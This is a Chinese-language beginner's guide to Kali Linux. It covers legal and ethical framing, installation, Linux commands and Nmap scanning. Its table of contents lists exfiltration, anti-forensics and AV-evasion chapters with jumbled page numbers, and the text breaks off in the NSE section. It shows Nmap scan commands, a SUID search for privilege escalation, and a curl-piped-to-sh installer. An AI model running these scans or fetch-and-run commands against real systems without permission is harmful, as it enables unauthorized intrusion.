
# Kali Linux 基础：使用 Nmap、Metasploit 等工具发现安全漏洞（初学者应用与软件开发完整指南第 13 册）

## 使用 Nmap 进行信息收集与侦察 44

### Nmap 简介 45
- 核心功能：45
- 为什么侦察用 Nmap？ 45
- 主机发现技术 46
- 常见主机发现方法 46
- 1. ICMP Echo 请求 (Ping) 46
- 2. TCP SYN Ping 46
- 3. TCP ACK Ping（仅限局域网） 47
- 5. 组合技术 47

### 端口扫描与服务枚举 47
- 端口扫描类型 47
- 1. TCP SYN 扫描（隐隐） 48
- 2. TCP 连接扫描 48
- 3. UDP 扫描 48
- 4. 全面扫描 47
- 服务枚举 47
- 操作系统指纹与脚本扫描 48
- 操作系统检测 48
- 脚本扫描 48
- 使用 Nmap 脚本引擎 (NSE) 自动化侦察 49
- 脚本分类 49
- 使用特定脚本 49
- 4. 枢纽渗透与隧道化: 78
- 凭据收集与数据外泄: 79
- 1. 凭据收集: 79
- a. Mimikatz: 79
- b. Windows 密钥箱与凭据管理器: 79
- c. 浏览器凭据转储: 79
- d. 键盘记录器与剪贴板抓取: 79
- e. 倾储 SAM & SYSTEM 注册表单元: 80
- 2. 数据外泄: 80
- a. 手动文件提取: 80
- b. 阶段存放与上传: 80
- c. 通过云服务或 Web 服务进行外泄: 80
- d. 隧道化与隐蔽通道: 80
- 清除足迹与反取证战术: 80
- 1. 清除日志: 80
- a. Windows: 81
- b. Linux: 81
- 2. 修改时间戳 (Timestomping): 81
- 3. 隐藏持久化机制: 81
- 4. 内存执行与无文件攻击: 81
- 5. 禁用安全控制: 83

## 使用 Empire 框架的高级攻击: 83
- PowerShell Empire 简介: 84
- 使用监听器 (Listeners) 和 代理 (Agents): 84
- 1. 设置监听器: 84
- 2. 启动代理: 84
- a. 生成阶段器 (Stagers): 85
- b. 与代理交互: 85
- 凭据窃取与键盘记录: 86
- 1. 在 Empire 中使用 Mimikatz: 86
- 2. 键盘记录: 87
- 文件传输、执行与枢纽渗透: 87
- 1. 传输文件: 87
- 2. 执行二进制文件和脚本: 87
- 3. 枢纽渗透: 88
- Empire 对比现代 EDR 和 AV: 88
- 1. 检测机制: 88
- 2. 规避技术: 89
- 3. 给红队的的建议: 89

## 密码攻击与破解策略: 91
- 离线与在线密码破解: 91
- 离线密码破解: 91
- 密码哈值的常见来源: 91
- 在线密码破解: 92

## 使用 Hashcat 和 John the Ripper 进行哈希识别与破解: 93
- 识别哈希: 93
- 哈希识别工具: 93
- 使用 Hashcat 破解: 94
- 基础语法: 94
- 核心特性: 94
- 使用 John the Ripper 破解: 95
- 模式: 95

## 凭据转储与重用攻击: 96
- 凭据转储: 96
- 常用方法: 96
- 凭据重用攻击: 96
- 示例: 96

## 使用 Crunch 和 Cewl 创建自定义字典字典: 99
- Crunch: 97
- Cewl: 98

## 社交工程技术: 99
- 使用 SET (社会工程工具包) 进行钓鱼攻击: 99
- SET 的功能: 99
- 在 Kali 中启动 SET: 100
- 常见的 SET SET 攻击场景: 100
- 克隆网站与收集凭据: 101
- 克隆与收集的步骤: 101
- 真实性技巧: 101
- 通过邮件投送恶意载荷: 102
- 邮件载荷的类型: 102
- 制作邮件的工具: 102
- 示例: 使用 SET 发送钓鱼邮件: 103
- 注意事项: 103
- 绕过用户意识与防御: 103
- 心理战术: 103
- 规避检测的技巧: 104
- 规避工具: 104
- 击败用户意识示例: 104

## 绕过防火墙与杀毒软件系统: 106
- 混淆与编码技术: 106
- 混淆类型: 106
- 示例: 混淆 PowerShell: 107
- 混淆工具: 107
- 使用 Veil 和 Shelter 生成自定义载荷: 108
- Veil 框架: 109
- Shelter: 109
- 隧道化与规避技术: 109
- SSH 和 VPN 隧道: 109
- DNS 隧道: 110
- HTTP/S 隧道: 110
- 云端隧道: 111
- 规避工具: 111
- 理解端点保护机制: 111
- 端端点保护的关键组件: 111
- 绕过技术: 112

## 使用 Kali Linux 进行 Web 应用测试: 113
- Web 漏洞概述 (OWASP 前 10): 113
- 1. 访问控制失效: 113
- 2. 密码学失效: 113
- 3. 注入攻击: 113
- 4. 不安全的设计: 114
- 5. 安全配置错误: 114
- 6. 漏洞和过时的组件: 114
- 7. 识别与认证失效: 114
- 8. 软件和数据完整性失效: 114
- 9. 安全日志与监控失效: 114
- 10. 服务端请求伪造 (SSRF): 114
- SQL 注入、CSRF 和 LFI/RFI: 114
- SQL 注入 (SoLi): 114
- 跨站脚本 (XSS): 115
- 跨站请求伪造 (CSRF): 116
- 本地文件包含 (LFI) 和远程文件包含 (RFI): 116

## 工具: Burp Suite, Nikto 和 Diruster: 117
- Burp Suite: 117
- Nikto: 118
- Diruster (或 Dirb): 118

## 手动与自动 Web 测试: 119
- 手动测试: 119
- 自动测试: 120
- 混合方法: 121

## 网络嗅探与流量分析: 122
- 使用 Wireshark 和 Tcpdump 捕获包: 122
- Wireshark: 122
- 核心特性: 123
- 常见用例: 123
- 基础: 123
- Tcpdump: 123

## 分析明文与加密流量: 124
- 明文流量: 124
- 加密流量: 125
- 解密: 125
- 使用 Wireshark 解密: 125
- 识别敏感数据: 126
- 发现: 126
- 关注点: 126
- Wireshark 过滤器: 126
- 组装: 127
- 流量: 127

## ARP 欺骗与中间人攻击: 127
- ARP 欺骗基础: 127
- ARP 欺骗工具: 127
- 中间人攻击 (MitM): 127
- 使用 Ettercap: 129
- Bettercap: 129

## 扫描与无线映射: 130
- 扫描技术: 130
- 映射: 130
- 工具: 130
- 识别隐藏 SSID: 131
- airmon-ng: 131
- aircrack-ng: 131
- kismet: 131

## 蓝牙蓝牙攻击: 132
- 蓝牙侦测: 132
- 蓝牙工具: 132
- hcitool: 132
- ldbus: 132
- bluelog: 132
- bluetooth: 132

## 恶意接入点创建与钓鱼攻击: 133
- 恶意接入点创建: 133
- 钓鱼攻击: 134
- Evil Twin: 134
- Honeypots: 134
- Wifisher: 134

## IoT 设备枚举与攻击: 135
- IoT 枚举技术: 136
- 常见漏洞: 136
- 攻击工具: 136
- Telnet 攻击: 136
- MQTT 协议: 136
- 示例: 136

## 编写自定义漏洞与脚本: 137
- 漏洞开发基础: 137
- 理解漏洞: 137
- 漏洞工作流: 138
- 栈溢出: 138
- 和 Shellcode 注入: 139
- 基于栈的缓冲区溢出分析: 140
- 使用 Python, Bash 和 PowerShell 进行渗透测试: 141
- Python: 141
- Bash: 142
- PowerShell: 143
- 自动化任务与编写简单工具: 144
- 暴力破解脚本 (Python): 144
- 使用 Bash 自动化工具链: 145
- 创建复用载荷生成器: 145

## 红队与模拟攻击: 146
- 红队、蓝队与紫队解释: 147
- 红队 (攻击性): 148



- 蓝队 (防御性): 146
- 紫队 (协作性): 146
- 与执行模拟攻击: 146
- 红队行动阶段: 148
- 红队中的行动安全 (OPSEC): 148
- 命令与控制 (C2) 技术: 149
- C2 通类型: 149
- 流行的 C2 框架: 149
- 报告与汇报: 150
- 红队报告结构: 150
- 汇报流程: 151

## 报告与文档: 153
- 专业报告的重要性: 153
- 1. 发现结果的清晰沟通: 153
- 2. 修复的可操作性建议: 153
- 3. 用于合规与审计的文档: 154
- 4. 风险与影响评估: 154
- 5. 安全态改进的衡量: 154

## 报告生成工具: 154
- 1. Dadis: 154
- 2. Faraday: 155
- 3. Metasploit Pro: 155
- 4. Nessus: 156
- 5. Burp Suite: 156
- 模板与真实案例: 156
- 报告模板结构: 156
- 真实案例: 158
- 2. 跟踪工具变更与新功能 162
- 关注安全馈送与漏洞数据库 163
- 1. 漏洞数据库 163
- 2. 安全馈送与新来源 163
- 3. 安全 Twitter 馈送与社交媒体 164
- 认证：OSCP, CEH, CompTIA+ 165
- 1. 攻防安全认证专家 (OSCP) 165
- 2. 认证道德黑客 (CEH) 166
- 3. CompTIA PenTest+ 166
- 社区、论坛与会议 167
- 1. 在线社区与论坛 167
- 2. 会议与聚会 169
- 3. 本地聚会与研讨会 169

# 常见问题 (FAQs) - 使用 Kali Linux 进行渗透测试 178

# 术语表 187

# Kali Linux 常用命令备查表 198

# 常用端口和协议表 208
- 额外注意事项：209

# 有用资源与进一步阅读 210
- 1. Kali Linux 官方资源 209
- 2. 渗透测试与 Kali Linux 书籍 210
- 3. 在线训练平台 211
- 4. 社区与论坛 212
- 5. YouTube 频道与视频教程 213
- 6. 漏洞数据库与漏洞利用库 213
- 7. 漏洞扫描器与渗透测试工具 215

# 渗透测试报告模板 215
- 渗透测试报告模板 221
- 示例报告（节选）221
- 执行摘要 221

# Kali Linux 简介

## 什么是 Kali Linux？

Kali Linux 是一个基于 Debian 的强大 Linux 发，专门为渗透测试、道德黑客和安全评估而设计。Kali 由 Offensive Security 开发并维护，被广泛认为是安全专业人员、道德黑客以及从事红队漏洞评估和取证分析的研究人员的首选平台。

与通用型 Linux 发行版不同，Kali Linux 预装了 600 多种渗透测试工具，从网络扫描器、漏洞评估器到无线分析和反向工程工具等。这些工具包含了行业标准的 Nmap、Metasploit、Whisper、Burp Suite、Aircrack-ng、John the Ripper、Empire 等。

Kali 为攻击性安全定制，强调定制化、隐性和灵活性。其模块化架构允许用户创建自定义的 ISO 镜像、为特定环境构建最小化安装，并执行持久性 USB 安装，使其在专业和教育领域均具有极高的通用性。

# Kali 的历史与演变

Kali Linux 是 BackTrack Linux 的精神和技术继承，而 BackTrack 本身是两个早期安全重点项目的合并：Whax 和 Auditor Security Collection。以下是其演变的时间线：

### BackTrack 时代（2006–2013）

BackTrack 最初由 Mati Aharoni（被称为“muts”）、Max Moser 等人于 2006 年发布。它将 Whax 和 Auditor 的优点结合成一个面向渗透测试和数字取证的 Live 发行版。由于其完善的工具集和易用性，BackTrack 迅速在黑客和网络安全社区中流行起来。

BackTrack 经历了几个主要版本，但存在局限性，特别是在其软件包系统中，使得更新和定制变得繁琐。

### Kali Linux 的诞生（2013）

2013 年 3 月，Kali Linux 作为 BackTrack 的完全重构版本正式发布，并以 Debian 为基础。这一转变在包管理、安全性和开发可扩展性方面带来了实质性的改进。Kali 采用了 Debian 的高级软件包工具 (APT)，允许进行无缝更新和更可靠的系统管理。

Kali Linux 的主要目标包括：
- 完全开源的开发模型
- 完全遵守 FHS（文件系统层次结构标准）
- 基于 Git 的包维护以确保透明度
- 针对移动和嵌入式设备的多平台及 ARM 支持

### Kali 开发的重大里程碑

- Kali 2.0 (2015)：引入了全新的用户界面并更新了工具集；转向了滚动发布（Rolling Release）模式。
- Kali Rolling (2016+)：转向 Debian Testing 分支以进行持续更新，确保工具和包保持最新状态。
- Kali NetHunter (2014+)：针对 Android 设备的移动渗透测试平台。
- 带有持久化加密的 Kali Live：允许用户从 USB 驱动器运行 Kali，并带有持久化存储和加密数据。
- Windows 子系统中的 Kali (WSL)：将 Kali 集成到 Windows 中用于混合环境。

今天，Kali 支持包括虚拟机、树莓派、云环境 (AWS, Azure)、容器 (Docker) 和移动设备，使其可用的最灵活、全面的渗透测试环境之一。

# 渗透测试中的法律与伦理考虑

Kali Linux 及其提供的工具是非常强大的——强大到如果如果不负责任地，很容易跨入非法领域。虽然工具本身是合法的，但**如何以及在哪里使用它们**决定了行为是道德的还是犯罪。

## 理解法律

道德黑客必须始终遵守法律。未经明确许可对网络进行未经授权的访问、扫描或探测可能导致严重的法律后果，包括罚金和监禁。

法律因国家和地区而异，但共同主题包括：
- 美国《计算机欺诈与滥用法》(CFAA)
- 欧洲《通用数据保护条例》(GDPR)
- 英国《计算机滥用法》(CMA)

这些法律将未经授权的访问、篡改和滥用数字系统定为犯罪。

## 白帽 vs 黑帽 vs 灰帽

- 白帽：在许可范围内并在合同协议范围范围内操作。符合道德且合法。
- 黑帽：在未经同意的情况下操作并带有恶意意图。非法且不符合道德。
- 灰帽：未经明确许可操作，但没有伤害意图。通常仍然是非法的。

为了站在法律正确的一方：
- 在测试系统之前始终获取书面许可。
- 遵循测试范围和交互规则（Rules of Engagement）。
- 负责任地报告漏洞，不要超出约定的范围进行利用。

# 认证与专业标准

许多道德黑客追求此类认证，例如：
- OSCP (攻防安全认证专家)
- CEH (认证道德黑客)
- CompTIA PenTest+
- CPT (认证渗透测试员)

这些认证强调法律合规性、职业道德和最佳实践，对于合法从业人员来说至关重要。

# 安全且合法的测试环境

负责任的网络安全实践的基石之一是构建一个受控且隔离的环境，该环境镜像了现实系统，而不会产生未经授权访问或数据泄露的风险。

## 实验室

创建测试实验室允许用户安全地练习黑客技术。推荐的设置包括：
- **虚拟机 (VMs)**：使用 VirtualBox、VMware 或 Hyper-V 等工具可以在单主机上运行多个隔离机器。
- **漏洞目标**：安装故意留漏洞的系统，如：
  - Metasploit
  - DVWA (脆弱 Web 应用)
  - OWASP 损坏应用程序
  - Hack The Box 虚拟机或 TryHackMe
- **虚拟网络**：在虚拟化软件内部设置内部网络以模拟企业环境。

### 网络隔离

确保实验室与你的生产环境或家庭网络**完全隔离**。你可以：
- 禁用虚拟机的互联网访问。
- 使用 NAT 或仅主机（Host-only）适配器。
- 避免桥接到真实的接口。

## 云实验室与平台

对于没有本地资源的用户，TryHackMe、Hack The Box 以及 Offensive Security Proving Grounds 等云平台提供了法的、托管的游戏化渗透测试环境。

## 最佳实践

- 永远不要扫描或攻击你不拥有或未获得许可测试的 IP 或域名。
- 保留你的测试和许可日志。
- 使用虚拟机的快照来快速还原更改。
- 对无意中的任何真实漏洞进行负责任的披露。

# 安装与配置 Kali Linux

在开始安装之前，了解 Kali Linux 的系统要求和可用版本至关重要。Kali 设计初衷是轻量化且多功能的，可以在各种硬件上运行，从强大的台式电脑到像树莓派那样的单板计算机。

### 最低系统要求



- CPU：至少 1 GHz 单核处理器（推荐使用多核）
- 内存（RAM）：至少 2 GB（建议 4 GB 或更高内存以获得最佳性能）
- 存储：至少 20 GB 磁盘空间
- 显卡：兼容标准 Linux 显示驱动程序
- 网络：以太网或无线适配器（用于网络工具）

这些规格适用于基础使用。对于资源密集型任务（例如使用多个虚拟机或高级后渗透渗透利用框架），建议使用更高的配置。

## 下载 Kali Linux

可以从其官方网站下载 Kali Linux：

`https://www.kali.org/get-kali`

提供多个版本供选择：

- 安装镜像（裸机）：用于直接安装到系统。
- 现场版镜像（Live Images）：从 USB 启动无需安装。
- 虚拟机镜像：为 VirtualBox 和 VMware 预构建。
- 网络安装程序（NetInstaller）：用于网络安装的轻量级 ISO。
- ARM 镜像：用于树莓派、Pinebook 和其他 ARM 设备。
- WSL：可在 Microsoft Store 获取，在 Windows 的 Linux 子系统中使用。

根据您的预定部署方式（裸机、虚拟机或现场 USB）选择镜像。使用提供的 `SHA256` 哈希验证下载的文件，以确保完整性和真实性。

# 在裸机、VirtualBox 和 VMware 上安装

Kali 可以安装在真实硬件上，也可以作为虚拟机内部的客户操作系统。虚拟机环境是实验室和实验的理想选择。

## 在裸机上安装

步骤：

- 创建可启动 USB：使用 `Rufus` 或 `Balena Etcher` 等工具将 Kali ISO 写入 USB 盘。
- 从 USB 启动：进入 BIOS/UEFI 设置，将 USB 设置为主启动设备。
- 启动安装程序：选择“图形化安装”(`Graphical Install`)进行引导式安装过程。
- 分区磁盘：在引导式（整个磁盘）或手动分区之间进行选择。如果需要，对分区进行加密。
- 配置用户：设置 `root` 用户（或在较新的 Kali 版本中使用标准用户）。
- 安装 GRUB：选择引导程序目标（通常为 `/dev/sda`）。
- 完成设置：重启进入新安装的 Kali。

Kali 将检测并安装所有驱动程序，但无线卡或 GPU 的专有驱动程序可能需要在安装后进行手动配置。

## 在 VirtualBox 中安装

- 下载 VirtualBox：可在 `https://www.virtualbox.org` 获取。
- 创建虚拟机：
  - 名称：`Kali Linux`
  - 类型：`Linux`
  - 版本：`Debian (64位)`
  - 内存：至少 2 GB
  - 磁盘：20 GB 动态分配
- 挂载 ISO：将 Kali ISO 挂载到虚拟机的光驱下。
- 安装：按照裸机步骤遵循图形化安装程序步骤。
- 安装增强功能（可选）：提高性能并启用剪贴板和文件共享。

## 在 VMware 中安装

- 下载 `VMware Workstation Player` 或 `VMware Fusion`。
- 打开预构建镜像或手动创建一个新的虚拟机。
- 自定义硬件：分配足够的内存、CPU 和磁盘空间。
- 安装 `VMware Tools`：为了获得更好的集成性能。

# 安装后的必要任务与更新

一旦安装好 Kali，请执行必要的安装后任务以加固和优化系统。

## 更新系统

使用 Kali 的滚动发布模型以保持最新。

```
sudo apt update && sudo apt full-upgrade -y
```

这将更新所有软件包，包括内核和安全工具。

## 启用非 root 用户（如果尚未执行）

早早版本的 Kali 默认使用 `root` 用户。较新版本鼓励使用标准用户：

```
sudo adduser username
```

```
sudo usermod -aG sudo username
```

# 安装额外工具

使用 `kali-linux-top10` 或其他元软件包：

```
sudo apt install kali-linux-top10
```

```
sudo apt install kali-linux-wireless
```

这些捆包包含了 `Nmap`、`Metasploit`、`Wireshark`、`Aircrack` 等工具。

# 启用 SSH（可选）

```
sudo systemctl enable ssh
```

```
sudo systemctl start ssh
```

确保安全地配置 SSH，更改默认密钥，并考虑防火墙规则。

# 配置网络和无线设置

许多渗透测试任务需要稳定且灵活的网络，特别是无线包注入和监控。

## 检查网络接口

```
ip a
```

寻找如 `eth0`、`wlan0` 或 `usb0` 等接口。

## 启用网络服务

如果网络服务被禁用：

```
sudo systemctl start NetworkManager
```

```
sudo systemctl enable NetworkManager
```

Kali 使用 `NetworkManager` 管理接口。可以在系统托盘中使用 GUI 界面，或通过：

```
nmtui
```

## 无线适配器

并非所有的 Wi-Fi 适配器都支持监听模式或包注入。推荐的芯片组包括：

- `Atheros AR9271`
- `Realtek RTL8812AU`
- `Ralink RT3070`

检查您的适配器是否支持监听模式：

```
iwconfig
```

启用监听模式：

```
sudo ip link set wlan0 down
```

```
sudo iwconfig wlan0 mode monitor
```

```
sudo ip link set wlan0 up
```

使用 `airmon-ng` 简化此操作：

```
sudo airmon-ng start wlan0
```

安装固件以提高兼容性：

```
sudo apt install firmware-realtek firmware-atheros
```

# 定制 Kali 环境

定制可以提高生产力和用户体验，特别是对于长期用户或在各种环境下工作的专业人士。

## 更改桌面环境

Kali 默认使用 `XFCE`，但你可以安装其他环境：

```
sudo apt install kali-desktop-gnome
```

```
sudo apt install kali-desktop-kde
```

在登录时选择 preferred 的环境。

## 设置 Bash/Zsh 主题

配合 `oh-my-zsh` 安装 `Zsh`：

```
sudo apt install zsh
```

```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
```

自定义 `.zshrc` 以设置提示符样式、别名和插件。

## 配置终端工具

- 使用 `tmux` 进行终端复用。
- 设置 `terminator` 以支持标签/平铺终端。
- 使用 `Powerline` 字体进行视觉增强。

# 自定义工具菜单

Kali 的 `XFCE` 菜单可以进行定制：

- 在“收藏”中添加/删除工具
- 按类别或工作流组织
- 使用自定义启动器运行脚本

## 创建快照（虚拟机用户）

在修改或测试工具之前，创建快照以便安全回滚。

# 渗透测试者的 Linux 命令行精通

掌握 Linux 命令行对于渗透测试人员至关重要。无论是进行侦察、利用系统还是分析渗透数据，高效使用终端都能节省时间并提供深层控制。Kali Linux 基于 Debian 构建，提供了丰富的针对攻击安全专业的命令行工具。

## 终端基础

终端是你与系统交互的主要界面。理解其结构和核心命令是高效渗透的基础。

## 常用终端快捷键

- `Tab`：自动补全命令和文件名
- `Ctrl + C`：终止运行中的进程
- `Ctrl + D`：退出或关闭终端
- `Ctrl + L`：清除屏幕（相当于 `clear`）
- `!!`：重复上一条命令
- `!<command>`：重复上一次该命令（例如 `!ls`）

## 基础导航命令

- `pwd`：打印当前工作目录
- `cd /path/to/dir`：切换目录
- `ls`：列出文件和目录
- `ls -la`：显示所有文件及元数据
- `echo $PATH`：显示环境变量 `PATH`

# 文件操作

- `touch filename`：创建一个空文件
- `cat file`：查看文件内容
- `more file`, `less file`：滚动查看文件内容
- `nano`, `vim`：文本编辑器
- `rm file`：删除文件
- `mv file new_location`：移动或重命名文件
- `cp file destination`：复制文件

# 文件系统管理

理解 Linux 文件系统层次结构有助于你定位和操作所需的文件，特别是在浏览系统内部或寻找配置错误时。

## Linux 文件系统层次结构

- `/` 文件系统的根目录
- `/home`: 用户目录
- `/etc`: 系统级配置文件



- `/var`: 日志和变量数据
- `/tmp`: 临时文件
- `/usr`: 用户应用程序和库
- `/bin`, `/sbin`: 核心二进制文件

# 目录管理

- `mkdir new_folder`: 创建新目录
- `rmdir folder`: 删除空目录
- `rm -r folder`: 删除目录及其内容
- `tree`: 目录结构的可视化表示

# 磁盘与空间管理

- `df -h`: 检查磁盘空间使用情况
- `du -sh folder`: 获取挂载点的大小
- `mount`, `umount`: 挂载或卸载文件系统
- `lsblk`: 显示连接的存储设备

# 用户管理与权限

权限提升是渗透测试的核心部分。了解用户和权限的结构有助于识别识别配置错误、弱点设置或获取更高权限的途径。

## 用户与组管理

- `whoami`: 当前用户
- `id`: 用户 ID 和所属组成员身份
- `adduser username`: 添加新用户
- `passwd username`: 设置或更改用户密码
- `usermod -aG group username`: 将用户添加到组

### 查看已登录用户

- `who`: 显示谁正在登录
- `w`: 更详细的信息
- `last`: 显示登录历史

### 文件权限

- `ls -l`: 以 `rwxr-xr--` 格式显示权限
- `chmod`: 修改权限
  - `chmod 755 file`: 为所有者设置执行，为其他人设置读取
- `chown`: 更改所有者
  - `chown user:group file`

### SUID 和 SGID 文件

查找具有特殊权限的文件：

```
find / -perm -4000 2>/dev/null # SUID
find / -perm -2000 2>/dev/null # SGID
```

这些文件可能被用于权限提升。

# 进程与服务监控

分析运行中的进程和服务对于识别漏洞、恶意软件或隐藏的持久机制至关重要。

## 查看与管理进程

- `ps aux`: 显示所有进程
- `top`: 实时进程监控
- `htop`: 高级交互式进程查看（通过 `apt install htop` 安装）
- `kill PID`: 终止进程
- `killall name`: 按名称杀死进程

## 检查服务与守护进程

- `systemctl status`: 检查系统服务管理器
- `systemctl start|stop|restart service`: 管理服务
- `service --status-all`: 查看所有 init.d 服务
- `netstat -tulnp`: 列出网络服务及其端口
- `ss -tulnp`: `netstat` 的现代替代方案

# 用于侦察的网络命令

侦察是渗透测试的第一步。了解如何通过 CLI 工具探测网络至关重要。

## IP 与接口管理

- `ip a`: 显示 IP 地址和接口
- `ip link set eth0 up/down`: 启用/禁用接口
- `ifconfig`: 已弃用但仍在使用
- `iwconfig`: 无线接口设置

## 主机发现

- `ping target`: 检查主机是否在线
- `traceroute target`: 显示到主机的路由
- `whois domain`: 域名注册信息
- `dig domain`: DNS 查询
- `host domain`: 备用 DNS 工具

## 端口扫描与指纹抓取

- `nc -v target port`: 使用 Netcat 获取指纹（Banner）
- `telnet target port`: 检查服务 banner（现在较不常用）
- `nmap target`: 基础端口扫描（后续章节将深入介绍）

示例：

```
nmap -sS -T4 -p- target.com
```

# ARP 与邻居发现

- `arp -a`: ARP 表 (IPv4)
- `ip neigh`: 邻居表 (IPv6 和 IPv4)

# 数据包捕获（基础）

- `tcpdump -i eth0`: 在接口上嗅探数据包
- `tcpdump -nn -i wlan0 port 80`: 过滤 HTTP 流量

# 理解渗透测试流程

渗透测试（pentesting）是一种结构化且符合伦理的信息系统安全性评估方法。它模拟真实世界的攻击，在恶意者利用之前识别漏洞。对于道德黑客和网络安全专业人员来说，深入理解渗透测试过程至关重要。这一过程受行业标准法律要求的约束，以确保安全、合法有效。

# 渗透测试阶段

渗透测试通常分为五个不同的阶段。每个阶段都有自己的目标、方法和交付物。跳过或执行不当任何阶段都可能导致结果不准确或法律后果。

### 1. 侦察（信息收集）

在此阶段，渗透测试者尽可能多收集关于目标的信息。这包括：
- 域名和 IP 地址
- 员工邮箱地址
- DNS 记录
- 开放的端口和服务
- 使用的技术

使用的工具：
- 被动：Google Dorking、WHOIS、Shodan、Netcraft
- 主动：Nmap、DNS 枚举、SNMP 扫描

### 2. 扫描与枚举

一旦收集了初始信息，扫描将识别活动系统、开放端口和运行的服务。枚举通过提取特定的系统信息来进一步深挖。

常见目标：
- 绘制网络地图
- 识别漏洞服务
- 收集用户名和共享

工具：
- Nmap
- Nessus
- Netcat
- Enum4linux
- Nikto

### 3. 利用

此阶段尝试利用发现的漏洞来获取系统的访问权限。利用可以是远程或本地的，可能针对软件缺陷、配置错误或弱凭据。

流行工具：
- Metasploit Framework
- SQLmap
- Hydra（暴力破解）
- Burp Suite（Web 应用攻击）

执行此阶段应保持谨慎，因为在没有妥当范围和管理的情况下，可能会导致系统崩溃。

# 4. 提利用

系统被攻破后，渗透测试者将评估潜在影响：
- 可以提升权限吗？
- 可以访问敏感数据吗？
- 可以建立持久化吗？

工具：
- Empire
- Mimikatz
- PowerShell 脚本

### 5. 报告

这是最重要的阶段之一，报告提供了发现、方法和修复策略。

报告包含：
- 执行摘要
- 漏洞的技术细节
- 漏洞证明（PoC）
- 风险评估与建议

# 范围设定与规划

良好的规划确保渗透测试符合业务目标并避免意外后果。

## 设定目标

明确定义：
- 范围内的目标（IP 范围、域名、应用程序）
- 范围外的资产
- 时间范围和测试窗口

## 类型

- 黑盒：无先验知识
- 白盒：拥有内部架构的全权限
- 灰盒：部分信息（常见于应用程序测试）

# 风险评估

评估：
- 潜在宕机的业务影响
- 系统脆弱性
- 数据敏感性

# 文档与报告

专业的渗透测试要求对每一步都进行详细记录。

## 测试期间

- 记录命令、工具和结果的日志
- 记录各项活动的时间戳笔记
- 成功利用的截图
- 使用的脚本或负载

这有助于追溯性、可重复性和工作证据。

## 最终报告结构

1. 执行摘要：面向利益相关者的清晰非技术概述
2. 方法论：概述使用的工具、框架和标准（如 OWASP, PTES）
3. 发现结果：按风险级别（CVSS 分）分类的详细漏洞
4. 漏洞证明：截图、负载、命令输出
5. 建议：可操作的修复策略
6. 结论：对组织安全状况的整体评估

报告必须针对受众进行定制：为 IT 团队提供技术版本，为管理层提供摘要版本。

# 运行规则与法律边界

没有明确授权的渗透测试是非法的，且被视为黑客行为。运行规则（RoE）确保测试符合伦理、合法且不造成伤害。

## RoE 的关键组成

- 书面授权：始终拥有签署的法律协议
- 范围定义：明确列出目标和排除项
- `时间与时长`：测试窗口和停机时间
- `测试类型`：明确是内部、外部、无线等等
- `漏洞利用边界`：定义哪些可以或不能被利用（例如，避免实施拒绝服务攻击）
- `通信协议`：定义如何以及何时报告关键发现结果

## 法律框架与标准

- `《计算机欺诈与滥用法》(CFAA)` – 美国
- `《通用数据保护条例》(GDPR)` – 欧盟
- `NIST SP 800-115` – 信息安全测试技术技术指南
- `OSSTMM` – 开源安全测试方法手册
- `PTES` – 渗透测试执行标准

# 渗透测试中的伦理

- `尊重隐私`：避免访问范围之外所需的数据
- `不造成伤害`：避免对系统或数据造成破坏
- `维护机密性`：将发现视为敏感信息
- `完全披露`：报告所有发现结果，包括未被利用的潜在风险

# 使用 Nmap 进行信息收集与侦察

侦察是渗透测试的第一阶段，也是 arguably最关键的阶段。它涉及到在启动任何利用尝试之前，尽可能地收集关于目标的相关信息。`Nmap`（网络映射）是此阶段最强大且最广泛使用的工具之一。它提供了主机发现、端口扫描、服务识别、操作系统检测和自动化脚本等基本功能，使其成为任何渗透测试者工具箱中不可或缺的工具。

## Nmap 简介



Nmap 是一个免费开源的网络发现和安全审计工具。它最初设计用于扫描大型网络，但其灵活性使其足以胜任单主机侦察。

主要特性：

- 主机发现
- 端口扫描
- 服务和版本检测
- 操作系统指纹
- 与目标的可脚本化交互 (`NSE`)

## 为什么用 Nmap 进行侦察？

- 具有主动扫描能力且误报率极低
- 在隐身和激进扫描模式下均高效
- 拥有强大的脚本引擎 (`NSE`)，具有高度可定制性
- 受大型安全专业人员社区信任和支持

基础语法：

`nmap [options] [target]`

## 主机发现技术

主机发现用于确定给定网络上哪些 IP 地址是活跃且可访问的。Nmap 提供了几种技术来识别存活主机，取决于环境和权限。

### 常见主机发现方法

1. `ICMP Echo Request (Ping)`

发送 ICMP 回显请求数据包。有响应的主机被认为在线。

```
nmap -sn 192.168.1.0/24
```

2. `TCP SYN Ping`

发送 TCP SYN 包以确定主机是否在特定端口上进行监听。

```
nmap -PS22,80,443 192.168.1.0/24
```

3. `TCP ACK Ping`

用于绕过某些防火墙。发送 TCP ACK 包以检查主机是否有响应。

```
nmap -PA80,443 192.168.1.0/24
```

4. `ARP Ping`（仅限局域网）

在局域网上极其可靠。发送 ARP 请求以发现主机，不受防火墙规则限制。

```
nmap -PR 192.168.1.0/24
```

5. 组合技术

结合多种方法可以提高检测的可靠性。

```
nmap -PE -PS22,80,443 -PA3389 192.168.1.0/24
```

## 端口扫描与服务枚举

一旦识别出存活主机，Nmap 就可以探测开放端口并确定这些端口上运行着的服务。

### 端口扫描类型

1. `TCP SYN 扫描`（隐身）

发送 SYN 包并等待 SYN-ACK 响应。

```
nmap -sS 192.168.1.1
```

2. `TCP 连接扫描`

当无法使用 SYN 扫描时使用（例如缺少原始套字权限）。

```
nmap -sT 192.168.1.1
```

3. `UDP 扫描`

由于缺乏确认机制，这种扫描难度较大，但对于发现 UDP 服务有用。

```
nmap -sU 192.168.1.1
```

4. 综合扫描

将多种扫描类型与服务及版本检测相结合。

```
nmap -sS -sV -sC -A 192.168.1.1
```

### 服务枚举

识别出开放端口后，下一步是确定每个端口背后的服务和版本。

```
nmap -sV 192.168.1.1
```

这有助于识别：

- 特定软件（例如 Apache 2.4.49）
- 与这些版本相关的漏洞
- 适当的攻击向量

## 操作系统指纹与脚本扫描

Nmap 利用 TCP/IP 协议栈的行为来推断主机的底层操作系统和设备类型。

### 操作系统检测

```
nmap -O 192.168.1.1
```

为了提高准确性，可以将操作系统检测与版本及脚本扫描结合：

```
nmap -A 192.168.1.1
```

注意：操作系统检测需要 root 权限，并可能受到防火墙或包过滤的影响。

### 脚本扫描

Nmap 的脚本引擎 (`NSE`) 允许执行高级任务。运行默认脚本：

```
nmap -sC 192.168.1.1
```

## 使用 Nmap 脚本引擎 (`NSE`) 自动化侦察

Nmap 脚本引擎 (`NSE`) 提供了自动化各种任务的强大功能。它分为：

- `auth:` 检查身份验证绕过
